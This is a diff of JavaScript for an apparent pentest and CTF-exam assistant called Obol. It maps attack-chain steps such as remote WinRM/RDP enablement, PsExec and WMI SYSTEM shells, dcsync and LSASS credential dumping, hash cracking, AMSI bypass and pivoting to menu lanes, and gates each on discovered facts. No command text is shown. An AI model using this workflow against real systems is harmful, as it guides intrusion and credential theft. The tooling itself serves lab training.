+    'advice.reauth': 'fresh-session re-authentication guidance',
+    'advice.password': 'password-change recovery guidance',
+    'advice.account': 'restricted-account bypass guidance',
+    'advice.hash': 'hash-format and mode guidance',
+    'advice.hosts': '/etc/hosts resolution guidance',
+    'advice.egress': 'egress-filtering bypass guidance',
+    'advice.certutil': 'clean Windows file-transfer guidance',
+    'advice.tty': 'interactive PTY upgrade guidance',
+    'advice.exec': 'binary execution recovery guidance',
+    'advice.amsi': 'AMSI bypass guidance',
+    'advice.ssh': 'SSH key authentication guidance',
+    'advice.web_access': 'web virtual-host and access guidance',
+    'advice.potato': 'SeImpersonate Potato selection guidance',
+    'exploit.hazard_version_gate': 'a strict version-banner gate in a public exploit',
+    'exploit.hazard_py3_syntax': 'Python 3-only syntax in an exploit script',
+    'exploit.hazard_java_target': 'a Java bytecode target-version hazard in an exploit',
+    'privesc.custom_binary': 'a non-package privileged custom binary',
+    'privesc.path_hijack_candidate': 'a relative-command PATH hijack lead',
+    'privesc.library_or_script_hijack': 'a writable library or script hijack lead',
+  };
+
+  function friendly(kind) {
+    if (FRIENDLY[kind]) return FRIENDLY[kind];
+    if (kind.indexOf('port:') === 0) return 'port ' + kind.split(':')[1] + ' open';
+    if (kind.indexOf('service.') === 0) return kind.split('.')[1] + ' service evidence';
+    if (kind.indexOf('advice.') === 0) return kind.split('.').slice(1).join(' ').replace(/_/g, ' ') + ' guidance';
+    if (kind.indexOf('vuln.') === 0) return 'a ' + kind.split('.').slice(1).join(' ').replace(/_/g, ' ') + ' vulnerability lead';
+    if (kind.indexOf('blocker.') === 0) return 'a ' + kind.split('.').slice(1).join(' ').replace(/_/g, ' ') + ' blocker';
+    if (kind.indexOf('.') > 0) return kind.replace(/\./g, ' ').replace(/_/g, ' ');
+    return kind;
+  }
+  // A SHORT Title-Case label for a fact chip ("Needs: Usable Credential"): the friendly phrase with a
+  // leading article dropped and each significant word capitalised. Short connectors stay lowercase.
+  var CHIP_SMALL = { a: 1, an: 1, the: 1, of: 1, or: 1, to: 1, 'in': 1, on: 1, and: 1, 'for': 1 };
+  function chipLabel(kind) {
+    var s = friendly(kind).replace(/^(a|an|the)\s+/i, '');
+    return s.split(/\s+/).map(function (w, i) {
+      if (i > 0 && CHIP_SMALL[w.toLowerCase()]) return w.toLowerCase();
+      // keep already-capitalised / acronym tokens (SMB, ADCS, NTDS, SYSTEM) as-is
+      if (/[A-Z]/.test(w.slice(1)) || w === w.toUpperCase()) return w;
+      return w.charAt(0).toUpperCase() + w.slice(1);
+    }).join(' ');
+  }
+
+  // ---- "Opens Up Next": the aspirational roadmap of locked moves ----------------------------------
+  // Only CAPABILITY-unlocks belong here - moves you work TOWARD (a credential, a shell, admin, a user
+  // list, a reachable service). Contingency moves (the blocker.* trap doctors, the vuln.* fingerprint
+  // exploits) are not a roadmap - you don't pursue "my clock is skewed" - so they are excluded; they
+  // surface reactively elsewhere. Report-only writeup checks are excluded too. The rest sort by how CLOSE
+  // they are to unlocking (fewest unmet prerequisites first), each carrying the fact-chips it still needs.
+  function opensUpNext(facts, pack, opts) {
+    return (OBOL.pack && OBOL.pack._cloudOpensUpNext) ? OBOL.pack._cloudOpensUpNext(facts, pack, opts) : [];
+  }
+  // -------------------------------------------------------------- OS helpers --
+  function normalizeOsName(value) {
+    var text = String(value || '').trim().toLowerCase();
+    if (text === 'windows' || text === 'win') return 'windows';
+    if (text === 'linux' || text === 'unix' || text === 'gnu/linux') return 'linux';
+    return '';
+  }
+
+  function hostOsFamily(facts) {
+    var families = {};
+    facts.values('host.os_family').forEach(function (v) {
+      var fam = normalizeOsName(v.family || '');
+      if (fam) families[fam] = true;
+    });
+    var keys = Object.keys(families);
+    if (!keys.length) {
+      if (facts.has('foothold.windows') || facts.has('winrm.authenticated') || facts.has('rdp.authenticated') || facts.has('os.windows') || facts.has('ad.dc_candidate')) families.windows = true;
+      if (facts.has('foothold.linux') || facts.has('os.linux')) families.linux = true;
+      keys = Object.keys(families);
+    }
+    if (!keys.length) {
+      facts.values('host.os_hint').forEach(function (v) {
+        var fam = normalizeOsName(v.family || '');
+        if (fam) families[fam] = true;
+      });
+      keys = Object.keys(families);
+    }
+    return keys.length === 1 ? keys[0] : '';
+  }
+
+  function osCompatibleWithFamily(facts, family, actionOs, action) {
+    var allowed = {};
+    (actionOs || []).forEach(function (item) { var n = normalizeOsName(item); if (n) allowed[n] = true; });
+    var keys = Object.keys(allowed);
+    if (family === 'linux' && action && (action.pack_id === 'ad_2026_09' || action.pack_id === 'obol_ad_2026_09') && !/^nmap-(?:fast-open-ports|version-scripts|vuln-scripts|udp-top)$/.test(action.id)) {
+      var hasAdSmb = facts.has('smb.reachable') || facts.has('ldap.reachable') || facts.has('kerberos.reachable') || facts.has('winrm.reachable') || facts.has('ad.dc_candidate');
+      if (!hasAdSmb) return false;
+    }
+    if (!keys.length) return true;
+    if (!family) return true;
+    if (family === 'linux' && allowed.windows && !allowed.linux && action && (action.id === 'ldap-deep-enum' || action.id === 'ad-anon-ldap-enum' || action.id === 'ldap-anon-bind')) {
+      if (facts && (facts.has('ldap.reachable') || facts.has('port:389') || facts.has('port:636'))) return true;
+    }
+    return !!allowed[family];
+  }
+
+  function osCompatible(facts, actionOs, action) {
+    return osCompatibleWithFamily(facts, hostOsFamily(facts), actionOs, action);
+  }
+
+  // ------------------------------------------------------------ pack loading --
+  // In the browser, packs are provided as already-parsed JSON (fetched by the loader),
+  // so loadPacks concatenates + dedupes by action id (first definition wins).
+  function actionsFromPackData(packData) {
+    var pid = (packData && (packData.id || packData.name)) || '';
+    return (packData.actions || []).map(function (a) {
+      var act = new Action(a);
+      if (pid && !act.pack_id) act.pack_id = pid;
+      return act;
+    });
+  }
+
+  function loadPacks(packDataList) {
+    var seen = {}, out = [];
+    (packDataList || []).forEach(function (packData) {
+      actionsFromPackData(packData).forEach(function (action) {
+        if (seen[action.id]) return;
+        seen[action.id] = true;
+        out.push(action);
+      });
+    });
+    return out;
+  }
+
+  var FLAG_HUNT_IDS = {
+    'flag-hunt-linux': 1,
+    'flag-hunt-root-linux': 1,
+    'flag-hunt-windows': 1,
+    'flag-hunt-root-windows': 1,
+  };
+  function isFlagHuntAction(a) {
+    if (!a) return false;
+    if (FLAG_HUNT_IDS[a.id] || a.pack_id === 'obol_flag_hunt_2026_09') return true;
+    var prod = a.produces || [];
+    return prod.length > 0 && prod.every(function (k) { return OBJECTIVE_FLAG_RE.test(k); });
+  }
+
+  // ------------------------------------------------------------------ planner (Cloud Worker Bridge) --
+  var V2_GOALS = ["objective.flag", "objective.local_flag", "objective.root_flag", "access.admin", "access.system", "access.root", "loot.ntds"];
+  var V2_GOALS_NO_FLAGS = ["access.admin", "access.system", "access.root", "loot.ntds"];
+  var V2_PRIV = { "access.admin": 1, "access.system": 1, "access.root": 1, "loot.ntds": 1, "objective.flag": 1, "objective.local_flag": 1, "objective.root_flag": 1 };
+  function v2EvidenceFact(g) { return false; }
+  function v2ProducesFoothold(a) { return false; }
+  function v2Indicated(a, haveObj) { return false; }
+  function v2Earned(a, haveObj) { return false; }
+  function accessEpoch(facts) {
+    if (!facts || typeof facts.has !== "function") return "anon";
+    if (facts.has("loot.ntds") || facts.has("hash.krbtgt") || facts.has("persistence.domain")) return "domain";
+    if (facts.has("access.system") || facts.has("access.root") || facts.has("access.admin")) return "admin";
+    if (facts.has("foothold.windows") || facts.has("foothold.linux") || facts.has("foothold.webshell") || facts.has("access.shell")) return "foothold";
+    if (facts.has("credential.validated") || facts.has("smb.authenticated") || facts.has("ldap.authenticated") || facts.has("winrm.authenticated") || facts.has("ssh.authenticated") || facts.has("rdp.authenticated") || facts.has("mssql.authenticated") || facts.has("credential.available")) return "auth";
+    return "anon";
+  }
+  var _consumedCache = typeof WeakMap === "function" ? new WeakMap() : null;
+  function consumedKinds(pack) {
+    if (_consumedCache && _consumedCache.has(pack)) return _consumedCache.get(pack);
+    var c = {};
+    (pack || []).forEach(function (a) {
+      (a.requires_all || []).concat(a.requires_any || []).forEach(function (k) { c[k] = 1; });
+    });
+    if (_consumedCache) _consumedCache.set(pack, c);
+    return c;
+  }
+  function isReportOnly(action, pack) {
+    if (!action || !action.report || action.report.severity !== "info") return false;
+    var prod = action.produces || [];
+    if (!prod.length) return false;
+    var consumed = pack ? consumedKinds(pack) : {};
+    for (var i = 0; i < prod.length; i++) if (consumed[prod[i]]) return false;
+    return true;
+  }
+  function rankActions(facts, pack, opts) {
+    return (OBOL.pack && OBOL.pack._cloudRankActions) ? OBOL.pack._cloudRankActions(facts, pack, opts) : [];
+  }
+  function nextActions(facts, pack, opts) {
+    return rankActions(facts, pack, opts);
+  }
+  function nextActionsV2(facts, pack, opts) {
+    return rankActions(facts, pack, opts);
+  }
+  function lockedActions(facts, pack, opts) {
+    return (OBOL.pack && OBOL.pack._cloudLockedActions) ? OBOL.pack._cloudLockedActions(facts, pack, opts) : [];
+  }
+  function blockedActions(facts, pack, opts) {
+    return lockedActions(facts, pack, opts).map(function (x) { return x.action; });
+  }
+  function planPath(facts, pack, opts) {
+    return (OBOL.pack && OBOL.pack._cloudPlanPath) ? OBOL.pack._cloudPlanPath(facts, pack, opts) : { path: null, cost: Infinity, reachable: false };
+  }
+  // ------------------------------------------------------- Interactive Path Chooser --
+  // Builds a structured multi-lane / multi-step menu model for high-choice move junctions:
+  //   1. Windows & Linux Flag Capture (flag-hunt-windows, flag-hunt-root-windows, flag-hunt-linux, flag-hunt-root-linux)
+  //   2. Interactive Shells & Remote Execution (win-interactive-shell, lateral-exec, own-domain-pth, fix-no-tty)
+  //   3. Post-Admin Credential Dumping (dcsync, dump-secrets, lsass-dump-onbox)
+  //   4. Offline Hash Cracking (crack-tgs, crack-kerberoast, crack-asrep, crack-asrep-offline, crack-ntlm, crack-netntlmv2)
+  //   5. File / Tool Staging & Enumeration (windows-enum, linux-enum, bloodhound-collect, ad-path-manual)
+  //   6. Pivoting & Tunneling (ligolo-tunnel-pivot, pivot-ligolo, pivot-chisel-socks, pivot-ssh-portforward)
+  var PATH_CHOOSER_IDS = {
+    'flag-hunt-windows': 'flag-capture',
+    'flag-hunt-root-windows': 'flag-capture',
+    'flag-hunt-linux': 'flag-capture',
+    'flag-hunt-root-linux': 'flag-capture',
+    'win-interactive-shell': 'interactive-shell',
+    'lateral-exec': 'interactive-shell',
+    'own-domain-pth': 'interactive-shell',
+    'fix-no-tty': 'interactive-shell',
+    'dcsync': 'cred-dump',
+    'dump-secrets': 'cred-dump',
+    'lsass-dump-onbox': 'cred-dump',
+    'crack-tgs': 'hash-cracking',
+    'crack-kerberoast': 'hash-cracking',
+    'crack-asrep': 'hash-cracking',
+    'crack-asrep-offline': 'hash-cracking',
+    'crack-ntlm': 'hash-cracking',
+    'crack-netntlmv2': 'hash-cracking',
+    'windows-enum': 'enum-staging',
+    'linux-enum': 'enum-staging',
+    'bloodhound-collect': 'enum-staging',
+    'ad-path-manual': 'enum-staging',
+    'smb-share-inventory': 'enum-staging',
+    'gpp-passwords': 'enum-staging',
+    'ligolo-tunnel-pivot': 'pivoting',
+    'pivot-ligolo': 'pivoting',
+    'pivot-chisel-socks': 'pivoting',
+    'pivot-ssh-portforward': 'pivoting',
+  };
+
+  var ACTION_TO_DECK = {
+    'flag-hunt-windows': { tabId: 'flags', laneId: 'user-onhost-proof' },
+    'flag-hunt-root-windows': { tabId: 'flags', laneId: 'both-flags-onhost' },
+    'flag-hunt-linux': { tabId: 'flags', laneId: 'linux-user-ssh' },
+    'flag-hunt-root-linux': { tabId: 'flags', laneId: 'linux-root-proof' },
+    'win-interactive-shell': { tabId: 'shells', laneId: 'shell-winrm' },
+    'lateral-exec': { tabId: 'shells', laneId: 'shell-admin-exec' },
+    'own-domain-pth': { tabId: 'shells', laneId: 'shell-admin-exec' },
+    'fix-no-tty': { tabId: 'shells', laneId: 'shell-ssh' },
+    'dcsync': { tabId: 'persistence', laneId: 'persist-hash-dump' },
+    'dump-secrets': { tabId: 'persistence', laneId: 'persist-hash-dump' },
+    'lsass-dump-onbox': { tabId: 'persistence', laneId: 'persist-hash-dump' },
+    'crack-tgs': { tabId: 'credops', laneId: 'credops-kerberoast' },
+    'crack-kerberoast': { tabId: 'credops', laneId: 'credops-kerberoast' },
+    'crack-asrep': { tabId: 'credops', laneId: 'credops-asreproast' },
+    'crack-asrep-offline': { tabId: 'credops', laneId: 'credops-asreproast' },
+    'crack-ntlm': { tabId: 'credops', laneId: 'credops-validate' },
+    'crack-netntlmv2': { tabId: 'credops', laneId: 'credops-validate' },
+    'windows-enum': { tabId: 'shares', laneId: 'shares-stage-tools' },
+    'linux-enum': { tabId: 'shares', laneId: 'shares-stage-tools' },
+    'bloodhound-collect': { tabId: 'credops', laneId: 'credops-acl-bh' },
+    'ad-path-manual': { tabId: 'credops', laneId: 'credops-acl-bh' },
+    'smb-share-inventory': { tabId: 'shares', laneId: 'shares-custom-gpp' },
+    'gpp-passwords': { tabId: 'shares', laneId: 'shares-custom-gpp' },
+    'ligolo-tunnel-pivot': { tabId: 'shares', laneId: 'shares-stage-tools' },
+    'pivot-ligolo': { tabId: 'shares', laneId: 'shares-stage-tools' },
+    'pivot-chisel-socks': { tabId: 'shares', laneId: 'shares-stage-tools' },
+    'pivot-ssh-portforward': { tabId: 'shells', laneId: 'shell-ssh' }
+  };
+
+  function hasPathChooser(action) {
+    var id = action && (typeof action === 'string' ? action : action.id);
+    return !!(id && PATH_CHOOSER_IDS[id]);
+  }
+
+  function buildPathChooser(action, facts, params, filled, eng) {
+    if (!action || !action.id || !PATH_CHOOSER_IDS[action.id]) return null;
+    eng = eng || ((root.OBOL && root.OBOL.store && typeof root.OBOL.store.active === 'function') ? root.OBOL.store.active() : null) || {};
+    params = params || (action.resolvedContext && action.resolvedContext.params) || eng.params || {};
+    facts = facts || (action.resolvedContext && action.resolvedContext.facts) || ((root.OBOL && root.OBOL.store && typeof root.OBOL.store.factSet === 'function') ? root.OBOL.store.factSet() : null);
+    if (!filled && root.OBOL && root.OBOL.command && typeof root.OBOL.command.fillAll === 'function') {
+      var ws = (root.OBOL.workspace && typeof root.OBOL.workspace.tokens === 'function') ? root.OBOL.workspace.tokens(eng) : undefined;
+      filled = root.OBOL.command.fillAll(action, facts, { params: params, profile: eng.profile, workspace: ws });
+    }
+    filled = filled || [];
+    var ctx = (root.OBOL && root.OBOL.command && typeof root.OBOL.command.buildContext === 'function')
+      ? root.OBOL.command.buildContext(facts, { action: action, params: params, profile: eng.profile })
+      : (params || {});
+    var activities = Array.isArray(eng.activities) ? eng.activities : [];
+    var target = action.contextTarget || params.target || ctx.target || '';
+    var epoch = facts ? accessEpoch(facts) : 'anon';
+
+    var openPorts = (root.OBOL && root.OBOL.command && typeof root.OBOL.command.openPorts === 'function' && facts)
+      ? root.OBOL.command.openPorts(facts) : [];
+    var hasPortScan = openPorts.length > 0;
+    var allFacts = (root.OBOL && root.OBOL.store && typeof root.OBOL.store.factSet === 'function')
+      ? root.OBOL.store.factSet()
+      : facts;
+    function hasFact(k) { return !!(facts && typeof facts.has === 'function' && facts.has(k)); }
+    function factVals(k) { return (facts && typeof facts.values === 'function') ? (facts.values(k) || []) : []; }
+    function hasAnyFact(k) { return hasFact(k) || !!(allFacts && typeof allFacts.has === 'function' && allFacts.has(k)); }
+    function allFactVals(k) {
+      var a = (allFacts && typeof allFacts.values === 'function') ? (allFacts.values(k) || []) : [];
+      return a.length ? a : factVals(k);
+    }
+    function isPortOpen(p) {
+      if (hasFact('port:' + p)) return true;
+      if (openPorts.indexOf(p) >= 0) return true;
+      return !hasPortScan;
+    }
+
+    var winrmOpen = hasFact('port:5985') || hasFact('port:5986') || openPorts.indexOf(5985) >= 0 || openPorts.indexOf(5986) >= 0 || hasFact('service.winrm') || hasFact('winrm.reachable') || hasFact('host.winrm_enabled') || hasFact('winrm.authenticated');
+    var rdpOpen = hasFact('port:3389') || openPorts.indexOf(3389) >= 0 || hasFact('service.rdp') || hasFact('rdp.reachable') || hasFact('host.rdp_enabled') || hasFact('rdp.authenticated');
+    var smbOpen = isPortOpen(445) || isPortOpen(139) || hasFact('service.smb') || hasFact('smb.reachable') || hasFact('smb.authenticated') || hasFact('smb.shares');
+    var sshOpen = isPortOpen(22) || hasFact('service.ssh') || hasFact('ssh.reachable') || hasFact('ssh.authenticated');
+    var hasAdmin = hasFact('access.admin') || hasFact('access.system') || hasFact('access.root') || hasFact('access.admin_shell')
+      || !!(ctx.dahash || params.dahash);
+    var hasWinShell = hasFact('foothold.windows') || hasFact('access.desktop') || hasFact('access.admin_shell') || hasFact('access.shell');
+    var hasLinShell = hasFact('foothold.linux') || hasFact('access.shell') || hasFact('access.root');
+    var useNtHash = !!(ctx.nthash && !ctx.password);
+    var useDaHash = !!(ctx.dahash && (!ctx.password || /^administrator$/i.test(ctx.user || '')));
+
+    var localFlagCaptured = hasFact('objective.local_flag');
+    var rootFlagCaptured = hasFact('objective.root_flag');
+    var localFlagOnHost = factVals('objective.local_flag').some(function (v) { return v && v.on_host === true; });
+    var rootFlagOnHost = factVals('objective.root_flag').some(function (v) { return v && v.on_host === true; });
+    var localFlagRemoteOnly = localFlagCaptured && !localFlagOnHost;
+    var needsBothFlagsOnHost = !localFlagCaptured || localFlagRemoteOnly;
+
+    var localPathKnown = hasFact('objective.flag_located_local')
+      || factVals('objective.flag_located').some(function (v) { return v && v.slot === 'local'; })
+      || !!(ctx.flag_path_local && ctx.flag_path_local.indexOf('{{') < 0);
+    var rootPathKnown = hasFact('objective.flag_located_root')
+      || factVals('objective.flag_located').some(function (v) { return v && v.slot === 'root'; })
+      || !!(ctx.flag_path_root && ctx.flag_path_root.indexOf('{{') < 0);
+
+    var id = action.id;
+    var category = PATH_CHOOSER_IDS[id];
+    var launcherTitle = 'Choose Your Path';
+    var launcherSub = 'Pick your preferred method below - run steps one by one or run the whole sequence and paste once.';
+    var callout = null;
+    var rawGroups = [];
+
+    if (id === 'flag-hunt-windows') {
+      launcherSub = 'Grab user.txt remotely from Kali, or open an interactive session on the host for an exam proof screenshot.';
+      var nonAdminClosedShells = !hasAdmin && !winrmOpen && !rdpOpen && !hasWinShell;
+      if (nonAdminClosedShells) {
+        callout = {
+          kind: 'info',
+          title: 'Standard User · Interactive Shell Ports (5985 / 3389) Currently Closed',
+          body: 'Non-admin domain users cannot spawn SMB/WMI services or enable RDP/WinRM remotely. Grab user.txt via "SMB Share Spider + Download" now - once you escalate to Administrator, Obol will automatically highlight "Capture Both User + Root Flags On-Host" so you get both exam proof screenshots in one shot.'
+        };
+      }
+      rawGroups = [
+        {
+          id: 'remote',
+          icon: 'zap',
+          label: 'Remote Flag Grab (From Kali)',
+          lanes: [
+            {
+              id: 'smb-share',
+              label: 'SMB Share Spider + Download',
+              portLabel: 'Port 445',
+              doneWhen: function () { return localFlagCaptured; },
+              lockedWhen: function () { return !smbOpen; },
+              lockBadge: 'Port 445 Closed',
+              steps: [
+                {
+                  title: 'Locate User Flag on SMB Share',
+                  sub: 'Spiders the Users share from Kali to discover the exact path to user.txt.',
+                  cmdIndex: 16,
+                  doneWhen: function () { return localPathKnown; }
+                },
+                {
+                  title: 'Download & Print User Flag via smbclient',
+                  sub: 'Downloads and prints user.txt from the discovered share path.',
+                  cmdIndex: 17,
+                  doneWhen: function () { return localFlagCaptured; }
+                }
+              ]
+            },
+            {
+              id: 'winrm-remote',
+              label: 'WinRM Remote Locate + Read',
+              portLabel: 'Port 5985',
+              doneWhen: function () { return localFlagCaptured; },
+              lockedWhen: function () { return !winrmOpen; },
+              lockBadge: 'Port 5985 Closed',
+              lockReason: 'Port 5985 (WinRM) is closed on this host. Use SMB Share Spider + Download, or enable WinRM once you have Admin.',
+              steps: [
+                {
+                  title: 'Locate User Flag Remotely over WinRM',
+                  sub: 'Searches C:\\Users for user.txt over WinRM without opening an interactive shell.',
+                  cmdIndex: 13,
+                  doneWhen: function () { return localPathKnown; }
+                },
+                {
+                  title: 'Read User Flag Remotely over WinRM',
+                  sub: 'Reads the discovered user.txt path directly over WinRM.',
+                  cmdIndex: useNtHash ? 15 : 14,
+                  doneWhen: function () { return localFlagCaptured; }
+                }
+              ]
+            },
+            {
+              id: 'smb-exec-remote',
+              label: 'SMB Remote Exec Sweep',
+              portLabel: 'Port 445 · Admin',
+              doneWhen: function () { return localFlagCaptured; },
+              lockedWhen: function () { return !hasAdmin; },
+              lockBadge: 'Needs Admin',
+              lockReason: 'nxc smb -x requires Local Administrator rights. Standard users should use SMB Share Spider + Download instead.',
+              steps: [
+                {
+                  title: 'Sweep All Desktops via SMB Command Execution',
+                  sub: 'Scans every user Desktop for user.txt / local.txt in under 1 second.',
+                  cmdIndex: useDaHash ? 19 : 18,
+                  doneWhen: function () { return localPathKnown; }
+                },
+                {
+                  title: 'Download Located Flag via SMB',
+                  sub: 'Retrieves and prints the located user flag.',
+                  cmdIndex: 17,
+                  doneWhen: function () { return localFlagCaptured; }
+                }
+              ]
+            }
+          ]
+        },
+        {
+          id: 'onhost',
+          icon: 'host',
+          label: 'Get On Host & Capture Proof',
+          lanes: [
+            {
+              id: 'winrm-shell',
+              label: 'Connect over WinRM (Evil-WinRM)',
+              portLabel: 'Port 5985',
+              doneWhen: function () { return localFlagOnHost; },
+              lockedWhen: function () { return !winrmOpen; },
+              lockBadge: 'Port 5985 Closed',
+              lockReason: hasAdmin ? 'Port 5985 is currently closed. Pick "Enable WinRM -> Connect" to open it remotely!' : 'Port 5985 is closed and enabling WinRM remotely requires Local Administrator rights.',
+              steps: [
+                {
+                  title: 'Connect Interactive WinRM Shell',
+                  sub: 'Opens an interactive Evil-WinRM PowerShell session on the target.',
+                  cmdIndex: useNtHash ? 1 : 0,
+                  ignoreSettled: true,
+                  doneWhen: function () { return hasFact('winrm.authenticated') && hasWinShell; }
+                },
+                {
+                  title: 'Locate User Flag Path in Shell',
+                  sub: 'Finds the exact path to user.txt across user Desktops.',
+                  cmdIndex: 10,
+                  doneWhen: function () { return localPathKnown; }
+                },
+                {
+                  title: 'Capture On-Host Proof (whoami + ipconfig + user.txt)',
+                  sub: 'Run inside Evil-WinRM and paste back (or screenshot) for your report.',
+                  cmdIndex: 12,
+                  doneWhen: function () { return localFlagOnHost; }
+                }
+              ]
+            },
+            {
+              id: 'enable-winrm-shell',
+              label: 'Enable WinRM -> Connect Evil-WinRM',
+              portLabel: '445 -> 5985',
+              doneWhen: function () { return localFlagOnHost; },
+              lockedWhen: function () { return !hasAdmin && !winrmOpen; },
+              lockBadge: 'Needs Admin',
+              lockReason: 'Enabling WinRM and firewall rules remotely over SMB requires Local Administrator rights.',
+              steps: [
+                {
+                  title: 'Enable WinRM & Firewall Rule Remotely',
+                  sub: 'Adds your user to Remote Management Users and opens WinRM (5985).',
+                  cmdIndex: 6,
+                  ignoreSettled: true,
+                  alreadyOpenWhen: function () { return winrmOpen && !hasFact('host.winrm_enabled'); },
+                  alreadyOpenBadge: 'Port 5985 Open',
+                  doneWhen: function () { return hasFact('host.winrm_enabled'); }
+                },
+                {
+                  title: 'Connect over WinRM (Evil-WinRM)',
+                  sub: 'Log into your newly enabled WinRM session.',
+                  cmdIndex: useNtHash ? 1 : 0,
+                  ignoreSettled: true,
+                  doneWhen: function () { return hasFact('winrm.authenticated') && hasWinShell; }
+                },
+                {
+                  title: 'Locate User Flag Path in Shell',
+                  sub: 'Finds the exact path to user.txt across user Desktops.',
+                  cmdIndex: 10,
+                  doneWhen: function () { return localPathKnown; }
+                },
+                {
+                  title: 'Capture On-Host Proof (whoami + ipconfig + user.txt)',
+                  sub: 'Prints identity, IP configuration, and user.txt in one frame.',
+                  cmdIndex: 12,
+                  doneWhen: function () { return localFlagOnHost; }
+                }
+              ]
+            },
+            {
+              id: 'enable-rdp-shell',
+              label: 'Enable RDP -> Connect over RDP',
+              portLabel: '445 -> 3389',
+              doneWhen: function () { return localFlagOnHost; },
+              lockedWhen: function () { return !hasAdmin && !rdpOpen; },
+              lockBadge: rdpOpen ? 'Ready' : 'Port 3389 Closed (Needs Admin)',
+              lockReason: 'Port 3389 (RDP) is closed and enabling RDP via registry/firewall requires Local Administrator rights.',
+              steps: [
+                {
+                  title: 'Enable RDP, Group Access & Firewall Remotely',
+                  sub: 'Adds your user to Remote Desktop Users, enables TermService, and opens port 3389.',
+                  cmdIndex: 6,
+                  ignoreSettled: true,
+                  alreadyOpenWhen: function () { return rdpOpen && !hasFact('host.rdp_enabled'); },
+                  alreadyOpenBadge: 'Port 3389 Open',
+                  doneWhen: function () { return hasFact('host.rdp_enabled'); }
+                },
+                {
+                  title: 'Connect over RDP (xfreerdp)',
+                  sub: 'Launches an interactive RDP desktop session on the target.',
+                  cmdIndex: 2,
+                  ignoreSettled: true,
+                  doneWhen: function () { return hasFact('rdp.authenticated'); }
+                },
+                {
+                  title: 'Locate User Flag Across Desktops',
+                  sub: 'Finds the exact user.txt path in under 1 second.',
+                  cmdIndex: 9,
+                  doneWhen: function () { return localPathKnown; }
+                },
+                {
+                  title: 'Capture On-Host Proof Inside RDP Command Prompt',
+                  sub: 'Run inside cmd.exe on the RDP desktop to print identity, IP, and user.txt.',
+                  cmdIndex: 11,
+                  doneWhen: function () { return localFlagOnHost; }
+                }
+              ]
+            },
+            {
+              id: 'wmi-psexec-shell',
+              label: 'WMI / PsExec Interactive Shell',
+              portLabel: 'Ports 135 / 445 · Admin',
+              doneWhen: function () { return localFlagOnHost; },
+              lockedWhen: function () { return !hasAdmin; },
+              lockBadge: 'Needs Admin',
+              lockReason: 'impacket-wmiexec and impacket-psexec require Local Administrator privileges on the target.',
+              steps: [
+                {
+                  title: 'Connect via WMI Semi-Interactive Shell',
+                  sub: 'Spawns a C:\\> prompt over WMI/SMB (works even when WinRM 5985 and RDP 3389 are closed).',
+                  cmdIndex: 3,
+                  ignoreSettled: true,
+                  doneWhen: function () { return hasWinShell; }
+                },
+                {
+                  title: 'Locate User Flag Across Desktops',
+                  sub: 'Finds the exact user.txt path in under 1 second.',
+                  cmdIndex: 9,
+                  doneWhen: function () { return localPathKnown; }
+                },
+                {
+                  title: 'Capture On-Host Proof (whoami + hostname + ipconfig + user.txt)',
+                  sub: 'Run inside your C:\\> shell and paste the output back.',
+                  cmdIndex: 11,
+                  doneWhen: function () { return localFlagOnHost; }
+                }
+              ]
+            }
+          ]
+        }
+      ];
+    } else if (id === 'flag-hunt-root-windows') {
+      launcherSub = 'Choose how to get on host (WMI, PsExec, Enable RDP, or Enable WinRM) or dump the flag remotely.';
+      if (needsBothFlagsOnHost) {
+        callout = {
+          kind: 'highlight',
+          title: localFlagRemoteOnly
+            ? 'User Flag Was Grabbed Remotely - Capture Both User + Root Flags On-Host!'
+            : 'Capture Both User + Root Flags On-Host in One Shot!',
+          body: localFlagRemoteOnly
+            ? 'Because user.txt was read remotely over SMB without an interactive shell, Step 3 in every "Get On Host" path below automatically captures BOTH user.txt and root.txt alongside whoami, hostname, and ipconfig in one exam-ready frame.'
+            : 'Neither flag has been captured on-host yet. Step 3 in every "Get On Host" path below automatically captures BOTH user.txt and root.txt alongside whoami, hostname, and ipconfig in one command.'
+        };
+      }
+      var onHostProofCmdIdx = needsBothFlagsOnHost
+        ? ((localPathKnown && rootPathKnown) ? 28 : 24)
+        : (rootPathKnown ? 27 : 21);
+      var onHostPsProofCmdIdx = needsBothFlagsOnHost
+        ? ((localPathKnown && rootPathKnown) ? 28 : 24)
+        : (rootPathKnown ? 29 : 21);
+      var onHostProofTitle = needsBothFlagsOnHost
+        ? 'Capture Both User + Root Flags On-Host (whoami + ipconfig + Both Flags)'
+        : 'Capture On-Host Root Proof (whoami + hostname + ipconfig + root.txt)';
+      var onHostProofSub = needsBothFlagsOnHost
+        ? 'Prints whoami, hostname, ipconfig, user.txt, and root.txt together in one terminal frame.'
+        : 'Prints whoami, hostname, ipconfig, and root.txt together in one terminal frame.';
+
+      rawGroups = [
+        {
+          id: 'onhost',
+          icon: 'host',
+          label: 'Get On Host & Capture Proof (Recommended)',
+          lanes: [
+            {
+              id: 'psexec-shell',
+              label: 'PsExec SYSTEM Shell (impacket-psexec)',
+              portLabel: 'Port 445',
+              doneWhen: function () { return rootFlagOnHost && (!needsBothFlagsOnHost || localFlagOnHost); },
+              steps: [
+                {
+                  title: 'Connect via PsExec Interactive SYSTEM Shell',
+                  sub: 'Opens a full interactive NT AUTHORITY\\SYSTEM cmd.exe pipe over SMB port 445.',
+                  cmdIndex: useDaHash ? 16 : 15,
+                  ignoreSettled: true,
+                  doneWhen: function () { return hasFact('access.system') && hasWinShell; }
+                },
+                {
+                  title: 'Locate User & Root Flag Paths Across Desktops',
+                  sub: 'Sweeps C:\\Users\\*\\Desktop for user.txt and root.txt in under 1 second.',
+                  cmdIndex: 23,
+                  doneWhen: function () { return rootPathKnown && (!needsBothFlagsOnHost || localPathKnown); }
+                },
+                {
+                  title: onHostProofTitle,
+                  sub: onHostProofSub,
+                  cmdIndex: onHostProofCmdIdx,
+                  doneWhen: function () { return rootFlagOnHost; }
+                }
+              ]
+            },
+            {
+              id: 'wmi-shell',
+              label: 'WMI Shell (impacket-wmiexec)',
+              portLabel: 'Ports 135 / 445',
+              doneWhen: function () { return rootFlagOnHost && (!needsBothFlagsOnHost || localFlagOnHost); },
+              steps: [
+                {
+                  title: 'Connect via WMI Semi-Interactive Shell',
+                  sub: 'Spawns a semi-interactive C:\\> prompt over WMI/SMB (works when WinRM 5985 & RDP 3389 are closed).',
+                  cmdIndex: useDaHash ? 14 : 13,
+                  ignoreSettled: true,
+                  doneWhen: function () { return hasWinShell; }
+                },
+                {
+                  title: 'Locate User & Root Flag Paths Across Desktops',
+                  sub: 'Sweeps C:\\Users\\*\\Desktop for user.txt and root.txt in under 1 second.',
+                  cmdIndex: 23,
